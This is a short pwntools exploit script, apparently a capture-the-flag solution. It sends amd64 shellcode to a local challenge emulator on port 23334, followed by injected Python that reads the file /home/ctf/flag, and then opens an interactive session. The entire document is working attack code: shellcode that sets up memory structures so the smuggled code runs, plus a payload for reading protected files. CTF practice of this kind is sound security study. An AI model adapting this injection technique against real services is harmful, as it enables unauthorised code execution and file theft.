from pwn import * 


# sh = process(['python3', 'emulator.py'])
sh = remote('localhost', 23334)
context.arch = 'amd64'
# context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'

shellcode = '''
xor rax, rax
mov rax, 0xdeadb000

xor rcx, rcx
mov rcx, 0xdeadbeef000

lea rbx, [rcx + 0x40]
mov [rax + 8], rbx

xor rbx, rbx 
mov ebx, {}

mov [rax + 16], ebx
mov ebx, 0xdeadbeef
mov [rax], ebx
'''

python_read_flag = b'''
with open('/home/ctf/flag') as fd:
    print(fd.read())
'''

# gdb.attach(sh)
size = len(python_read_flag)

payload = asm(shellcode.format(size)).ljust(0x40, b'\x00') + python_read_flag
sh.send(payload)


sh.interactive()
